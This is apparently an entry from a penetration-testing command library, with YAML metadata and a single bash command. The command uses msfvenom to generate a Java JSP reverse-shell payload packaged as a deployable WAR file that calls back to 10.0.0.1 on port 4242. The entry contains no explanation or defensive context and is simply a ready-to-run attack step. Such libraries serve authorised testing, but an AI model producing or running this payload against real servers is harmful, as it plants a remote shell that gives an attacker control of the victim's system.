---
id: b698d2e5-c8f3-4b17-a626-0272d9aab969
name: Generate Java WAR Reverse Shell Payload
type: command
executor: bash
data: $ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war
  > shell.war
output: null
created_at: '2023-04-06T03:56:24.923637+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
---

# Generate Java WAR Reverse Shell Payload

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war > shell.war
```


